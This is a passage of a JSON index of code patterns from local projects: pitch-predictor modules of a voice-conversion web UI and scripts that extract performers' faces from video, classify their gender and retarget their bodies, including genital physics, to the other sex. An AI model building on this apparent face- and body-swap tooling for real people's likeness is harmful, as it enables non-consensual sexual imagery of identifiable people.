          "from torch import nn",
          "from . import spec_utils"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/infer_pack/modules/F0Predictor/DioF0Predictor.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, hop_length=512, f0_min=50, f0_max=1100, sampling_rate=44100):",
          "def interpolate_f0(self, f0):\n\"\"\"\n\u5bf9F0\u8fdb\u884c\u63d2\u503c\u5904\u7406\n\"\"\"",
          "def resize_f0(self, x, target_len):",
          "def compute_f0(self, wav, p_len=None):",
          "def compute_f0_uv(self, wav, p_len=None):"
        ],
        "class_defs": [
          "class DioF0Predictor(F0Predictor):"
        ],
        "imports": [
          "import numpy as np",
          "import pyworld",
          "from infer.lib.infer_pack.modules.F0Predictor.F0Predictor import F0Predictor"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/infer_pack/modules/F0Predictor/__init__.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/infer_pack/modules/F0Predictor/HarvestF0Predictor.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, hop_length=512, f0_min=50, f0_max=1100, sampling_rate=44100):",
          "def interpolate_f0(self, f0):\n\"\"\"\n\u5bf9F0\u8fdb\u884c\u63d2\u503c\u5904\u7406\n\"\"\"",
          "def resize_f0(self, x, target_len):",
          "def compute_f0(self, wav, p_len=None):",
          "def compute_f0_uv(self, wav, p_len=None):"
        ],
        "class_defs": [
          "class HarvestF0Predictor(F0Predictor):"
        ],
        "imports": [
          "import numpy as np",
          "import pyworld",
          "from infer.lib.infer_pack.modules.F0Predictor.F0Predictor import F0Predictor"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/infer_pack/modules/F0Predictor/PMF0Predictor.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, hop_length=512, f0_min=50, f0_max=1100, sampling_rate=44100):",
          "def interpolate_f0(self, f0):\n\"\"\"\n\u5bf9F0\u8fdb\u884c\u63d2\u503c\u5904\u7406\n\"\"\"",
          "def compute_f0(self, wav, p_len=None):",
          "def compute_f0_uv(self, wav, p_len=None):"
        ],
        "class_defs": [
          "class PMF0Predictor(F0Predictor):"
        ],
        "imports": [
          "import numpy as np",
          "import parselmouth",
          "from infer.lib.infer_pack.modules.F0Predictor.F0Predictor import F0Predictor"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/RVC/rvc-webui/infer/lib/infer_pack/modules/F0Predictor/F0Predictor.py",
        "docstrings": [],
        "function_defs": [
          "def compute_f0(self, wav, p_len):\n\"\"\"\ninput: wav:[signal_length]\np_len:int\noutput: f0:[signal_length//hop_length]\n\"\"\"",
          "def compute_f0_uv(self, wav, p_len):\n\"\"\"\ninput: wav:[signal_length]\np_len:int\noutput: f0:[signal_length//hop_length],uv:[signal_length//hop_length]\n\"\"\""
        ],
        "class_defs": [
          "class F0Predictor(object):"
        ],
        "imports": [],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      }
    ],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Users/davidquinton/Projects/character-pipeline/scripts",
    "name": "scripts",
    "languages": [
      "Python"
    ],
    "python_patterns": [
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/scripts/anatomical_retarget.py",
        "docstrings": [],
        "function_defs": [
          "def male_average(cls) -> 'SkeletonSpec':\n\"\"\"Average male proportions\"\"\"\nreturn cls(\nshoulder_width=0.26,  # Broader shoulders\nhip_width=0.17,       # Narrower hips\ntorso_length=0.30,\nleg_length=0.47,\narm_length=0.44,\nhead_size=0.13,\nheight_cm=178.0",
          "def female_average(cls) -> 'SkeletonSpec':\n\"\"\"Average female proportions\"\"\"\nreturn cls(\nshoulder_width=0.22,  # Narrower shoulders\nhip_width=0.20,       # Wider hips\ntorso_length=0.28,\nleg_length=0.48,\narm_length=0.42,\nhead_size=0.12,\nheight_cm=164.0",
          "def default_male(cls) -> 'AnatomicalConfig':\n\"\"\"Default male anatomical configuration\"\"\"\nconfig = cls()\n\n# Define bone chain (simplified - actual implementation would be more detailed)\nconfig.bones = [\nAnatomicalBone(\nname=\"anatomy_root\",\nparent=\"pelvis\",\nlocal_position=(0.0, -0.08, 0.02),",
          "def __init__(self, source_spec: SkeletonSpec, target_spec: SkeletonSpec):",
          "def retarget_pose(self, pose_landmarks: np.ndarray) -> np.ndarray:\n\"\"\"\nRetarget a single pose from source to target proportions.\n\nArgs:\npose_landmarks: (33, 4) array of [x, y, z, visibility]\n\nReturns:\nRetargeted pose landmarks\n\"\"\"",
          "def retarget_sequence(self, pose_sequence: np.ndarray) -> np.ndarray:\n\"\"\"\nRetarget a sequence of poses.\n\nArgs:\npose_sequence: (N, 33, 4) array of poses\n\nReturns:\nRetargeted pose sequence\n\"\"\"",
          "def __init__(self):",
          "def generate_morph_sequence(self, source_gender: str, target_gender: str) -> List[Dict]:\n\"\"\"\nGenerate the sequence of morphs to transform body shape.\n\nReturns list of morph operations to apply.\n\"\"\"",
          "def __init__(self, config: AnatomicalConfig):",
          "def export_unity_config(self, output_path: Path):\n\"\"\"Export physics configuration for Unity\"\"\"\nunity_config = {\n\"anatomical_bones\": [],\n\"physics_settings\": {\n\"collision_enabled\": self.config.collision_enabled,\n\"self_collision\": self.config.self_collision,\n\"collision_radius\": self.config.collision_radius,\n\"use_bone_physics\": self.config.use_bone_physics,\n\"physics_blend\": self.config.physics_blend,",
          "def export_unreal_config(self, output_path: Path):\n\"\"\"Export physics configuration for Unreal Engine\"\"\"\nunreal_config = {\n\"physics_asset\": {\n\"bodies\": [],\n\"constraints\": [],\n},\n\"animation_blueprint\": {\n\"bone_chain\": [bone.name for bone in self.config.bones],\n\"physics_blend\": self.config.physics_blend,",
          "def __init__(self, output_dir: Path):",
          "def process_performer(self,",
          "def process_video_swap(video_path: str,"
        ],
        "class_defs": [
          "class SkeletonSpec:",
          "class AnatomicalBone:",
          "class AnatomicalConfig:",
          "class SkeletonRetargeter:",
          "class BodyShapeTransformer:",
          "class AnatomicalPhysicsSetup:",
          "class PerformerSwapPipeline:"
        ],
        "imports": [
          "import numpy as np",
          "from dataclasses import dataclass, field",
          "from typing import List, Dict, Tuple, Optional",
          "from pathlib import Path",
          "import json",
          "import cv2",
          "import cv2",
          "from gender_classifier_v2 import classify_video",
          "import argparse"
        ],
        "comments": [
          "# Ratios relative to height",
          "# Absolute scale",
          "# Physics properties",
          "# Base positioning (relative to pelvis)",
          "# Bone chain for physics",
          "# Physics settings",
          "# Animation settings",
          "# Define bone chain (simplified - actual implementation would be more detailed)",
          "# Scrotum bones for physics",
          "# MediaPipe pose landmark indices",
          "# Calculate retargeting ratios",
          "# Get reference points",
          "# Retarget each body part relative to pelvis",
          "# Shoulders - scale width",
          "# Hips - scale width",
          "# Arms - scale from shoulders",
          "# Elbow relative to shoulder",
          "# Wrist relative to elbow",
          "# Legs - scale from hips",
          "# Knee relative to hip",
          "# Ankle relative to knee",
          "# Overall height adjustment",
          "# Define transformation morphs",
          "# Chest reduction (breast tissue removal)",
          "# Shoulder broadening",
          "# Hip narrowing",
          "# Muscle definition",
          "# Waist adjustment (less taper)",
          "# Inverse transformations",
          "# Convert bones to Unity format",
          "# Spring joint for physics",
          "# Capsule collider",
          "# Physics body",
          "# Constraint to parent",
          "# Initialize components",
          "# No swap needed - just export original data",
          "# Retarget skeleton proportions",
          "# Generate body morphs",
          "# Setup anatomical physics if becoming male",
          "# Save retargeted poses",
          "# Swap face texture if provided",
          "# Export physics configs if anatomical elements needed",
          "# Save morph data",
          "# Save summary",
          "# Step 1: Classify performers",
          "# Step 2: Extract motion for each performer",
          "# (This would integrate with the full orchestrator to get pose sequences)",
          "# Step 3: Process swaps",
          "# Load male face texture if available",
          "# For demo, create dummy pose sequence",
          "# In real usage, this would come from full video processing",
          "# Save results"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 2,
        "error_handling": 0,
        "decorators": [
          "@dataclass",
          "@classmethod",
          "@classmethod",
          "@dataclass",
          "@dataclass",
          "@classmethod"
        ]
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/scripts/regenerate_face_meshes.py",
        "docstrings": [],
        "function_defs": [
          "def regenerate_face_mesh_from_texture(performer_dir: Path, reconstructor: PhotorealisticFaceReconstructor):\n\"\"\"Regenerate face mesh for a performer using existing texture\"\"\"\n\n# Check for existing texture\ntexture_path = performer_dir / \"face_texture.png\"\nface_png_path = performer_dir / \"face.png\"\noriginal_face_path = performer_dir / \"original_face.png\"\n\n# Find the best available face image\nif texture_path.exists():",
          "def main():"
        ],
        "class_defs": [],
        "imports": [
          "import sys",
          "import json",
          "import numpy as np",
          "import cv2",
          "from pathlib import Path",
          "import trimesh",
          "from PIL import Image",
          "from face_reconstruction import PhotorealisticFaceReconstructor"
        ],
        "comments": [
          "# Add parent to path",
          "# Check for existing texture",
          "# Find the best available face image",
          "# Load the face image",
          "# Detect face landmarks in this image",
          "# Normalize 3D landmarks",
          "# Extract texture with proper crop info",
          "# Compute UV coordinates from 2D landmarks",
          "# Create mesh with embedded texture",
          "# Export",
          "# Also save the texture",
          "# Verify the output",
          "# Verify texture is embedded",
          "# Direct mesh check",
          "# Initialize reconstructor",
          "# Find all performer directories",
          "# Check if they have a body mesh (skip if not)",
          "# Check current face mesh",
          "# Regenerate",
          "# Show final sizes"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/scripts/face_reconstruction.py",
        "docstrings": [],
        "function_defs": [
          "def generate_full_triangulation():\n\"\"\"Generate complete face triangulation using Delaunay on UV coordinates\"\"\"\n# Use canonical UV coordinates for 468 landmarks\n# and compute Delaunay triangulation\nfrom scipy.spatial import Delaunay\n\n# Canonical UV coordinates for 468 face landmarks (normalized 0-1)\n# This is a simplified version - ideally loaded from MediaPipe's data\nuv_coords = np.zeros((468, 2))\n",
          "def __init__(self, models_dir: Path = None):",
          "def _generate_triangulation(self, num_landmarks: int = 478) -> np.ndarray:\n\"\"\"Generate face mesh triangulation using Delaunay on actual landmark positions\"\"\"\n# This will be recomputed for each face using actual landmark positions\n# For initialization, use a placeholder\nreturn None\n\ndef _triangulate_landmarks(self, landmarks_2d: np.ndarray) -> np.ndarray:\n\"\"\"Create Delaunay triangulation from 2D landmark positions\"\"\"",
          "def _triangulate_landmarks(self, landmarks_2d: np.ndarray) -> np.ndarray:\n\"\"\"Create Delaunay triangulation from 2D landmark positions\"\"\"\nfrom scipy.spatial import Delaunay\n\n# Normalize to avoid numerical issues\nmin_vals = landmarks_2d.min(axis=0)\nmax_vals = landmarks_2d.max(axis=0)\nnormalized = (landmarks_2d - min_vals) / (max_vals - min_vals + 1e-6)\n\ntry:",
          "def extract_landmarks_from_frame(self, frame: np.ndarray) -> Optional[Dict]:\n\"\"\"Extract 468 face landmarks from a single frame\"\"\"\n# Convert BGR to RGB\nrgb_frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)\nmp_image = mp.Image(image_format=mp.ImageFormat.SRGB, data=rgb_frame)\n\nresult = self.face_landmarker.detect(mp_image)\n\nif not result.face_landmarks or len(result.face_landmarks) == 0:\nreturn None",
          "def extract_face_texture(self, frame: np.ndarray, landmarks_2d: np.ndarray,",
          "def compute_uv_from_landmarks_2d(self, landmarks_2d: np.ndarray, crop_info: Dict) -> np.ndarray:\n\"\"\"Compute UV coordinates that map 2D landmarks to texture coordinates.\"\"\"\n# Normalize landmarks to texture coordinates\nmin_x = crop_info['min_x']\nmax_x = crop_info['max_x']\nmin_y = crop_info['min_y']\nmax_y = crop_info['max_y']\n\nuv_coords = np.zeros((len(landmarks_2d), 2))\n",
          "def compute_uv_coordinates(self, landmarks_3d: np.ndarray) -> np.ndarray:\n\"\"\"Compute UV coordinates for landmarks based on projection (fallback)\"\"\"\n# Simple cylindrical UV mapping\nuv_coords = np.zeros((len(landmarks_3d), 2))\n\n# Center the landmarks\ncenter = landmarks_3d.mean(axis=0)\ncentered = landmarks_3d - center\n\nfor i, lm in enumerate(centered):",
          "def reconstruct_from_video(self, video_path: Path, output_dir: Path,",
          "def _normalize_landmarks(self, landmarks: np.ndarray) -> np.ndarray:\n\"\"\"Normalize and scale landmarks to reasonable dimensions\"\"\"\n# Center\ncenter = landmarks.mean(axis=0)\nnormalized = landmarks - center\n\n# Scale to approximately 20cm head width\ncurrent_width = normalized[:, 0].max() - normalized[:, 0].min()\nscale = 0.2 / (current_width + 1e-6)  # 20cm = 0.2m\nnormalized *= scale",
          "def _create_mesh(self, vertices: np.ndarray, uv_coords: np.ndarray,",
          "def reconstruct_from_frames(self, frames: List[np.ndarray], output_dir: Path) -> Dict:\n\"\"\"Reconstruct face from a list of frames\"\"\"\noutput_dir.mkdir(parents=True, exist_ok=True)\n\nall_landmarks = []\nbest_frame = None\nbest_frame_score = 0\nbest_landmarks = None\n\nfor frame in frames:",
          "def test_face_reconstruction():\n\"\"\"Test face reconstruction on sample video\"\"\"\nimport sys\n\nif len(sys.argv) < 2:\nprint(\"Usage: python face_reconstruction.py <video_path>\")\nreturn\n\nvideo_path = Path(sys.argv[1])\noutput_dir = Path(\"test_output/face_reconstruction\")"
        ],
        "class_defs": [
          "class PhotorealisticFaceReconstructor:"
        ],
        "imports": [
          "import numpy as np",
          "import cv2",
          "from pathlib import Path",
          "from typing import List, Dict, Tuple, Optional, Union",
          "import json",
          "import trimesh",
          "import mediapipe as mp",
          "from mediapipe.tasks import python as mp_tasks",
          "from mediapipe.tasks.python import vision",
          "from scipy.spatial import Delaunay",
          "from scipy.spatial import Delaunay",
          "from PIL import Image",
          "import sys"
        ],
        "comments": [
          "# MediaPipe Tasks API",
          "# Canonical face mesh triangulation (468 landmarks \u2192 triangles)",
          "# This is the standard MediaPipe face mesh topology",
          "# Forehead",
          "# Left eye region",
          "# Right eye region",
          "# Nose",
          "# Lips outer",
          "# Lips inner",
          "# Left cheek",
          "# Right cheek",
          "# Jaw left",
          "# Jaw right",
          "# Extended triangulation for full face coverage",
          "# Use canonical UV coordinates for 468 landmarks",
          "# and compute Delaunay triangulation",
          "# Canonical UV coordinates for 468 face landmarks (normalized 0-1)",
          "# This is a simplified version - ideally loaded from MediaPipe's data",
          "# Generate approximate UV coords based on landmark indices",
          "# These are rough approximations - the mesh will be refined with actual landmarks",
          "# Map index to UV space (rough approximation)",
          "# Create face landmarker",
          "# Precompute triangulation",
          "# This will be recomputed for each face using actual landmark positions",
          "# For initialization, use a placeholder",
          "# Normalize to avoid numerical issues",
          "# Fallback to basic triangulation",
          "# Convert BGR to RGB",
          "# Extract 3D landmarks",
          "# Get blendshapes if available",
          "# Get transformation matrix",
          "# Calculate face bounding box with padding",
          "# Crop face region",
          "# Resize to texture size",
          "# Normalize landmarks to texture coordinates",
          "# Map landmark position to UV space (0-1)",
          "# Clamp to valid range",
          "# Note: V is typically flipped in UV space",
          "# Simple cylindrical UV mapping",
          "# Center the landmarks",
          "# Cylindrical projection",
          "# Use y as v coordinate (normalized)",
          "# Collect landmarks from multiple frames",
          "# Score frame quality based on face size and clarity",
          "# Check if face is mostly frontal",
          "# Neutral expression preferred",
          "# Average landmarks across frames for stability",
          "# Scale and center the mesh",
          "# Extract texture from best frame",
          "# Compute UV coordinates",
          "# Get average 2D landmarks for triangulation",
          "# Create mesh with proper triangulation",
          "# Export as GLB",
          "# Export as OBJ for compatibility",
          "# Save metadata",
          "# Save best face image",
          "# Center",
          "# Scale to approximately 20cm head width",
          "# Flip Z so face points forward (positive Z)",
          "# Use Delaunay triangulation on 2D projections",
          "# Filter triangles to only include valid vertex indices",
          "# Generate triangulation from XY projection of vertices",
          "# Create visual with texture if available",
          "# Convert numpy array to PIL Image (trimesh needs PIL for GLB export)",
          "# OpenCV uses BGR, convert to RGB",
          "# Create PBR material for GLB compatibility",
          "# Create TextureVisuals with the material",
          "# Create mesh with vertex colors (skin tone)",
          "# Score frame",
          "# Average landmarks",
          "# Extract texture and get crop info for UV mapping",
          "# Create mesh with proper UV mapping based on 2D landmarks",
          "# Use the 2D landmark positions to compute correct UVs for the texture",
          "# Export"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 4,
        "error_handling": 7,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/scripts/auto_extract_males.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, min_confidence: float = 0.6):",
          "def _calculate_quality(self, face_crop: np.ndarray, landmarks: np.ndarray) -> float:\n\"\"\"Calculate face quality score based on size, sharpness, and frontality.\"\"\"\n# Size score (larger is better)\nh, w = face_crop.shape[:2]\nsize_score = min(1.0, (h * w) / (300 * 300))\n\n# Sharpness (Laplacian variance)\ngray = cv2.cvtColor(face_crop, cv2.COLOR_BGR2GRAY)\nsharpness = cv2.Laplacian(gray, cv2.CV_64F).var()\nsharpness_score = min(1.0, sharpness / 500)",
          "def _classify_gender(self, face_crop: np.ndarray) -> Tuple[str, float]:\n\"\"\"Classify gender using DeepFace.\"\"\"\ntry:\n# DeepFace analyze\nresult = DeepFace.analyze(\nface_crop,\nactions=['gender'],\nenforce_detection=False,\nsilent=True\n)",
          "def _extract_face_crop(self, frame: np.ndarray, landmarks_2d: np.ndarray, padding: int = 30) -> np.ndarray:\n\"\"\"Extract face region from frame.\"\"\"\nh, w = frame.shape[:2]\n\nxs = landmarks_2d[:, 0]\nys = landmarks_2d[:, 1]\n\nx1 = max(0, int(min(xs)) - padding)\nx2 = min(w, int(max(xs)) + padding)\ny1 = max(0, int(min(ys)) - padding)",
          "def process_video(self, video_path: str, sample_rate: int = 15) -> List[DetectedFace]:\n\"\"\"Process video and return all detected male faces.\"\"\"\nvideo_path = Path(video_path)\ncap = cv2.VideoCapture(str(video_path))\n\nfps = cap.get(cv2.CAP_PROP_FPS)\ntotal_frames = int(cap.get(cv2.CAP_PROP_FRAME_COUNT))\nduration = total_frames / fps\n\nprint(f\"Processing: {video_path.name}\")",
          "def select_best_faces(self, faces: List[DetectedFace], max_performers: int = 5) -> List[DetectedFace]:\n\"\"\"Select best quality face for each unique performer.\"\"\"\nif not faces:\nreturn []\n\n# Sort by quality score\nsorted_faces = sorted(faces, key=lambda f: f.quality_score, reverse=True)\n\n# For now, simple approach: take top N by quality\n# TODO: Add face embedding clustering to group same person",
          "def export_character(self, face: DetectedFace, output_dir: Path, name: str):\n\"\"\"Export face as character assets.\"\"\"\noutput_dir.mkdir(parents=True, exist_ok=True)\n\n# Save texture (resized to 1024x1024)\ntexture = cv2.resize(face.face_crop, (1024, 1024))\ntexture_path = output_dir / f\"{name}_texture.png\"\ncv2.imwrite(str(texture_path), texture)\n\n# Build and save mesh",
          "def process_video_auto(video_path: str, output_dir: str, max_performers: int = 2):\n\"\"\"Main function to automatically extract male performers from video.\"\"\"\nvideo_path = Path(video_path)\noutput_dir = Path(output_dir)\n\nextractor = AutoMaleExtractor(min_confidence=0.6)\n\n# Process video\nall_faces = extractor.process_video(str(video_path), sample_rate=15)\n"
        ],
        "class_defs": [
          "class DetectedFace:",
          "class AutoMaleExtractor:"
        ],
        "imports": [
          "import cv2",
          "import numpy as np",
          "from pathlib import Path",
          "import json",
          "import argparse",
          "from dataclasses import dataclass",
          "from typing import List, Dict, Optional, Tuple",
          "import trimesh",
          "import hashlib",
          "import mediapipe as mp",
          "from mediapipe.tasks import python as mp_python",
          "from mediapipe.tasks.python import vision",
          "from deepface import DeepFace"
        ],
        "comments": [
          "# MediaPipe for face detection",
          "# DeepFace for gender classification",
          "# Set up MediaPipe",
          "# Size score (larger is better)",
          "# Sharpness (Laplacian variance)",
          "# Frontality (based on landmark symmetry)",
          "# Compare left and right eye positions",
          "# Check if face is roughly frontal",
          "# DeepFace analyze",
          "# If classification fails, return unknown",
          "# Detect faces with MediaPipe",
          "# Extract landmarks",
          "# Extract face crop",
          "# Classify gender",
          "# Only keep males with sufficient confidence",
          "# Sort by quality score",
          "# For now, simple approach: take top N by quality",
          "# TODO: Add face embedding clustering to group same person",
          "# Save texture (resized to 1024x1024)",
          "# Build and save mesh",
          "# Save landmarks",
          "# Save manifest",
          "# Process video",
          "# Select best faces",
          "# Export each",
          "# Save batch manifest"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 3,
        "error_handling": 2,
        "decorators": [
          "@dataclass"
        ]
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/scripts/performer_swap.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self):",
          "def _ensure_models(self):\n\"\"\"Download models if needed.\"\"\"\nimport urllib.request\n\nself.POSE_MODEL_PATH.parent.mkdir(parents=True, exist_ok=True)\n\nif not self.POSE_MODEL_PATH.exists():\nprint(f\"Downloading pose model...\")\nurllib.request.urlretrieve(self.POSE_MODEL_URL, self.POSE_MODEL_PATH)\nprint(f\"Saved: {self.POSE_MODEL_PATH}\")",
          "def _init_detectors(self):\n\"\"\"Initialize MediaPipe detectors.\"\"\"\n# Pose detector\npose_options = vision.PoseLandmarkerOptions(\nbase_options=mp_python.BaseOptions(model_asset_path=str(self.POSE_MODEL_PATH)),\noutput_segmentation_masks=False,\nnum_poses=4,\nmin_pose_detection_confidence=0.5,\nmin_tracking_confidence=0.5,\n)",
          "def _classify_gender(self, face_crop: np.ndarray) -> Tuple[Gender, float]:\n\"\"\"Classify gender from face crop.\"\"\"\ntry:\nresult = DeepFace.analyze(\nface_crop,\nactions=['gender'],\nenforce_detection=False,\nsilent=True\n)\nif isinstance(result, list):",
          "def _extract_face_crop(self, frame: np.ndarray, face_landmarks) -> Optional[np.ndarray]:\n\"\"\"Extract face region from frame.\"\"\"\nh, w = frame.shape[:2]\n\nxs = [lm.x * w for lm in face_landmarks]\nys = [lm.y * h for lm in face_landmarks]\n\npad = 30\nx1 = max(0, int(min(xs)) - pad)\nx2 = min(w, int(max(xs)) + pad)",
          "def analyze_video(self, video_path: str, sample_rate: int = 10) -> Dict[int, PerformerTrack]:\n\"\"\"\nAnalyze video to identify and track all performers.\nReturns dict mapping performer_id to their tracking data.\n\"\"\"",
          "def _process_frame(self, frame: np.ndarray, frame_idx: int):\n\"\"\"Process a single frame for pose and face detection.\"\"\"\nh, w = frame.shape[:2]\nrgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)\nmp_image = mp.Image(image_format=mp.ImageFormat.SRGB, data=rgb)\n\n# Detect poses\npose_result = self.pose_detector.detect(mp_image)\n\n# Detect faces",
          "def get_female_performers(self) -> List[PerformerTrack]:\n\"\"\"Get all female performer tracks.\"\"\"\nreturn [t for t in self.performer_tracks.values() if t.gender == Gender.FEMALE]\n\ndef get_male_performers(self) -> List[PerformerTrack]:\n\"\"\"Get all male performer tracks.\"\"\"",
          "def get_male_performers(self) -> List[PerformerTrack]:\n\"\"\"Get all male performer tracks.\"\"\"\nreturn [t for t in self.performer_tracks.values() if t.gender == Gender.MALE]\n\ndef create_swap_mapping(self,\nfemale_track: PerformerTrack,\nmale_target: SwapTarget) -> Dict:\n\"\"\"",
          "def create_swap_mapping(self,",
          "def export_motion_bvh(self, track: PerformerTrack, output_path: str, fps: float = 30.0):\n\"\"\"Export performer motion as BVH file for Unity/Unreal.\"\"\"\n# BVH skeleton definition (simplified)\nbvh_content = self._generate_bvh(track.poses, fps)\n\nwith open(output_path, 'w') as f:\nf.write(bvh_content)\n\nprint(f\"Exported BVH: {output_path}\")\n",
          "def _generate_bvh(self, poses: List[np.ndarray], fps: float) -> str:\n\"\"\"Generate BVH file content from pose data.\"\"\"\n# MediaPipe to BVH bone mapping\nbone_map = {\n'Hips': 23,      # Left hip (we'll average with right)\n'Spine': 11,     # Approximation\n'Neck': 0,       # Nose as proxy\n'Head': 0,\n'LeftShoulder': 11,\n'LeftArm': 13,",
          "def process_video_with_swap(self,",
          "def main():"
        ],
        "class_defs": [
          "class Gender(Enum):",
          "class PerformerTrack:",
          "class SwapTarget:",
          "class PerformerSwapPipeline:"
        ],
        "imports": [
          "import cv2",
          "import numpy as np",
          "from pathlib import Path",
          "import json",
          "import argparse",
          "from dataclasses import dataclass, field",
          "from typing import List, Dict, Optional, Tuple",
          "from enum import Enum",
          "import mediapipe as mp",
          "from mediapipe.tasks import python as mp_python",
          "from mediapipe.tasks.python import vision",
          "from deepface import DeepFace",
          "import urllib.request"
        ],
        "comments": [
          "# MediaPipe for pose and face",
          "# Gender classification",
          "# Pose detector",
          "# Face detector",
          "# Summarize findings",
          "# Detect poses",
          "# Detect faces",
          "# Match faces to poses based on position",
          "# Get pose center (use nose or chest)",
          "# Find closest face",
          "# Get or create performer track",
          "# Simple ID based on position - in production would use tracking",
          "# New performer - classify gender",
          "# Store pose data",
          "# Store face data",
          "# Check if this is a better face frame",
          "# BVH skeleton definition (simplified)",
          "# MediaPipe to BVH bone mapping",
          "# BVH header (simplified skeleton)",
          "# Motion data",
          "# Extract hip position (average of left/right hip)",
          "# Simplified rotation extraction (would need proper IK in production)",
          "# Analyze video",
          "# Get performers by gender",
          "# Create swap mappings for females",
          "# Export motion",
          "# Also export male performer motions (no swap needed)",
          "# Save best face",
          "# Save manifest",
          "# Load male character targets",
          "# Default male character if none specified"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 9,
        "error_handling": 1,
        "decorators": [
          "@dataclass",
          "@dataclass"
        ]
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/scripts/preview_engine.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, canvas_size: Tuple[int, int] = (800, 1000)):",
          "def _normalize_pose(self, pose: np.ndarray) -> np.ndarray:\n\"\"\"Normalize pose to fit canvas, centered on hips.\"\"\"\nif len(pose) < 25:\nreturn pose\n\n# Get hip center\nhip_center = (pose[LEFT_HIP, :2] + pose[RIGHT_HIP, :2]) / 2\n\n# Get body height (nose to hip midpoint)\nbody_height = np.linalg.norm(pose[NOSE, :2] - hip_center)",
          "def _draw_skeleton(self, canvas: np.ndarray, pose: np.ndarray,",
          "def _overlay_face(self, canvas: np.ndarray, face_img: np.ndarray,",
          "def render_performer(self, performer_dir: Path,",
          "def _render_single(self, poses: Optional[np.ndarray],",
          "def _render_comparison(self, poses: Optional[np.ndarray],",
          "def _create_error_canvas(self, message: str) -> np.ndarray:\n\"\"\"Create error message canvas.\"\"\"\ncanvas = np.zeros((self.canvas_h, self.canvas_w, 3), dtype=np.uint8)\ncanvas[:] = (30, 30, 35)\ncv2.putText(canvas, f\"Error: {message}\", (50, self.canvas_h // 2),\ncv2.FONT_HERSHEY_SIMPLEX, 0.8, (0, 0, 255), 2)\nreturn canvas\n\ndef render_all_performers(self, output_dir: Path) -> List[np.ndarray]:\n\"\"\"Render previews for all performers in output directory.\"\"\"",
          "def render_all_performers(self, output_dir: Path) -> List[np.ndarray]:\n\"\"\"Render previews for all performers in output directory.\"\"\"\noutput_dir = Path(output_dir)\npreviews = []\n\nfor performer_dir in sorted(output_dir.glob(\"performer_*\")):\nif performer_dir.is_dir():\npreview = self.render_performer(performer_dir)\npreviews.append((performer_dir.name, preview))\n",
          "def create_summary_grid(self, output_dir: Path,",
          "def main():"
        ],
        "class_defs": [
          "class PreviewEngine:"
        ],
        "imports": [
          "import cv2",
          "import numpy as np",
          "from pathlib import Path",
          "import json",
          "from typing import List, Dict, Optional, Tuple",
          "import argparse"
        ],
        "comments": [
          "# MediaPipe pose landmark connections for skeleton drawing",
          "# Face",
          "# Torso",
          "# Left arm",
          "# Right arm",
          "# Left leg",
          "# Right leg",
          "# Key landmark indices",
          "# Get hip center",
          "# Get body height (nose to hip midpoint)",
          "# Scale to fit 60% of canvas height",
          "# Center on canvas",
          "# Draw connections",
          "# Draw joints",
          "# Get head position and size",
          "# Estimate head size from shoulder width",
          "# Resize face",
          "# Calculate position (center face on nose, slightly up)",
          "# Ensure within bounds",
          "# Blend face onto canvas",
          "# Create alpha mask (ellipse for natural blend)",
          "# Blend",
          "# Load manifest",
          "# Load poses",
          "# Load face",
          "# Determine layout",
          "# Side by side comparison",
          "# Single view",
          "# Title",
          "# Draw skeleton",
          "# Overlay face",
          "# Just show face centered",
          "# Info box",
          "# Create wide canvas",
          "# Divider",
          "# Labels",
          "# Left side - original female proportions (approximated)",
          "# Slightly narrow shoulders, widen hips for female look",
          "# Draw original",
          "# Right side - retargeted male proportions",
          "# Overlay face on both sides",
          "# Arrow in center",
          "# Calculate grid size",
          "# Thumbnail size",
          "# Resize to thumbnail",
          "# Add label",
          "# Show first performer"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/character-pipeline/scripts/face_alignment_download.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, output_size: int = 512):",
          "def _get_face_app(self):",
